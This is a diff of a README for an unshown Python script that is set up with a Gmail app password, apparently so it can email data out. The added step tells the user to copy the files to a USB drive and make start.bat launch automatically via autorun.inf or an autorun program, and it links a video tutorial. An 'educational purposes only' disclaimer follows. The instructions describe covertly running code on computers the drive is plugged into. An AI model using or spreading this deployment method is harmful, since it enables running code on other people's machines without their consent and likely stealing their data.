@@ -16,7 +16,9 @@ Step 2: Replace The * Your Gmail App Password Here * With Your Gmail App Passwor
 
 Step 3: Save The Python Script.
 
-Step 4: Convert The Python Script To EXE With Auto-Py-To-EXE Or Open "start.bat".
+Step 4:  Copy The Files To Your USB Flash Drive. And Make It Run The start.bat With An autorun.inf Or The One Provided In This Repository (ONLY WORKS ON SOME COMPUTERS!) Or You Can Use An Autorun Program To Make It Run The start.bat.
+
+# TUTORIAL FOR THE AUTORUN PROGRAM: https://www.youtube.com/watch?v=g1-Rvi6EE8s&t=117s
 
 # Warning!
 I Am Not Responsible For Any Problems Here, This Is Only For Educational Purposes.
